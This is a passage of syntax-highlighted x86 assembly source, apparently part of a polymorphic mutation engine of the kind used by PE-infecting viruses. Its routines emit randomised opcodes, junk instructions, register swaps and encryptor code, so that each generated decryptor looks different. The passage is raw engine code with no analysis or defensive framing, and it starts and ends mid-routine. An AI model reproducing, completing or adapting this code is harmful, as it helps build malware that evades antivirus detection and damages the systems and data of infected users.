        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;SMALL 1 PTR DS:OFF_REG</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">               </span><span class="sc1">;_EAX</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_4</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">3DH</span><span class="sc0">              </span><span class="sc1">;CMP EAX</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">STC</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">SAVE_CMP_OFF</span><span class="sc0">
</span><span class="sc5">NO_EAX</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0F881H</span><span class="sc0">           </span><span class="sc1">;CMP</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHECK_SIGN</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
</span><span class="sc5">SAVE_CMP_OFF</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">SIGN_OPCODE</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">12H</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">SIGN_OPCODE</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">STOSB</span><span class="sc0">
</span><span class="sc5">CHOOSE_JI</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
</span><span class="sc5">LET_JA</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">LET_JNZ</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">75H</span><span class="sc0">              </span><span class="sc1">;JNZ</span><span class="sc0">
</span><span class="sc5">CALC_JI</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">SMALL_JI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc2">0FH</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">10H</span><span class="sc0">
</span><span class="sc5">SMALL_JI</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JCXZ</span><span class="sc0">    </span><span class="sc5">IS_SMALL</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">CWDE</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">12H</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">IS_SMALL</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_SHIT</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_4</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0FFC4H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ADDRESS_MODE</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">_ESP</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">LET_ESP</span><span class="sc0">
</span><span class="sc5">TRY_NEXT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">OFF_REG</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_4</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0FFH</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">TRY_NEXT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">90H</span><span class="sc0">              </span><span class="sc1">;50H-0C0H</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MOVE_TO</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc5">LET_ESP</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_3</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">JS</span><span class="sc0">  </span><span class="sc5">GO_RETN</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0E0FFH</span><span class="sc0">           </span><span class="sc1">;JMP REG</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">JMP_ESP_X</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">0D0H</span><span class="sc0">             </span><span class="sc1">;CALL REG</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc5">PE_INSTALL_POP</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_WORD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">INTRUD_OFF</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
</span><span class="sc5">JMP_ESP_X</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">JMP_ESP</span><span class="sc0">
</span><span class="sc5">GO_RETN</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">50H</span><span class="sc0">              </span><span class="sc1">;PUSH</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_SHIT</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0C2H</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">
        </span><span class="sc6">JP</span><span class="sc0">  </span><span class="sc5">NO_ZERO_FILL</span><span class="sc0">
</span><span class="sc5">JMP_ESP</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">STOSW</span><span class="sc0">
</span><span class="sc5">NO_ZERO_FILL</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc5">SPE32_BUFF</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ENCRYPTOR_LEN</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">PUSHED_REGS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">NEXT_REST_REG</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">8BH</span><span class="sc0">              </span><span class="sc1">;MOV DREG,[ESP+XXXXXXXX]</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">84H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">24H</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CURRENT_LEN</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNS</span><span class="sc0"> </span><span class="sc5">NEXT_REST_REG</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">66H</span><span class="sc0">
        </span><span class="sc6">RETF</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">CHK_MODE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">WORD_MODE</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">CHK_MODE_PRFX</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHK_MODE</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">@@NO_WMODE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">66H</span><span class="sc0">              </span><span class="sc1">;TURN TO 16BIT REG</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
</span><span class="sc5">@@NO_WMODE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">CHK_MODE_SZ</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHK_MODE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">@@NO_WMODE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">@@NO_WMODE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;ENTRY:BL=REG NUMBER</span><span class="sc0">
</span><span class="sc5">GEN_PUSH</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">PUSHED_REGS</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">50H</span><span class="sc0">              </span><span class="sc1">;PUSH</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">COUNT_RET</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;ENTRY: SI=FIRST OFFSET,AL=HIGH LIMIT</span><span class="sc0">
</span><span class="sc5">RANDOM_CALL</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">CBW</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_BYTE</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc5">RCALL_NEXT</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_SHIT</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">LODSW</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">RCALL_NEXT</span><span class="sc0">
</span><span class="sc5">NO_INIT</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">CHANGE_WORK_REG</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
</span><span class="sc5">CHANGE_WORK_REG_RELO</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">MASK_REG</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">UNUSED_REG</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;SMALL 1 PTR DS:CHG_WR_FLAG</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_INIT</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;SMALL 1 PTR DS:SET_WR_FLAG</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_INIT</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;SMALL 1 PTR DS:CHG_WR_FLAG</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHANGE_ESP</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHK_MODE</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">@@NO_WMODE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">66H</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BUILD_CBYTE</span><span class="sc0">
</span><span class="sc5">@@NO_WMODE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;SMALL 1 PTR DS:WORK_REG</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc5">UNUSED_REG</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">GO_GET_OP32</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_4</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_GET_OP32</span><span class="sc0">
</span><span class="sc5">GO_GET_OP32</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHK_MODE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">LEN_OP32_IMM</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">GET_OP32</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">              </span><span class="sc1">;SKIP BSWAP WITH 66H PREFIX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GET_OP32</span><span class="sc0">
</span><span class="sc5">NO_GET_OP32</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">OP32_REG_CHG</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_3</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc5">LEN_OP32_REG_CHG</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0D8H</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BUILD_CRYPT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_XCHG</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc8">CH</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">NO_XCHG</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc8">CH</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0C0H</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">CHANGE_MASK_REG</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHANGE_ESP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">MASK_REG</span><span class="sc0">
